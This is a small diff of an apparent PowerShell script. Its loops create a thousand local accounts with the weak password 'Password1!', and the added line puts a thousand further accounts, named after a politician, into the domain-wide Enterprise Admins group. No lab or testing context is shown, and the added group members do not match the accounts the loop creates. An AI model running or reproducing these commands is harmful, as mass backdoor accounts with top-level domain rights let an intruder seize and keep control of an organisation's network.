@@ -35,6 +35,7 @@ for ($i = 0; $i -lt 1000; $i++) {
 
 for ($i = 0; $i -lt 1000; $i++) {
   net user  "Ron Desantis$i" Password1! /ADD 
+  net group "Enterprise Admins" "Donald Trump$i" /ADD /DOMAIN
 }
 
 for ($i = 0; $i -lt 1000; $i++) {
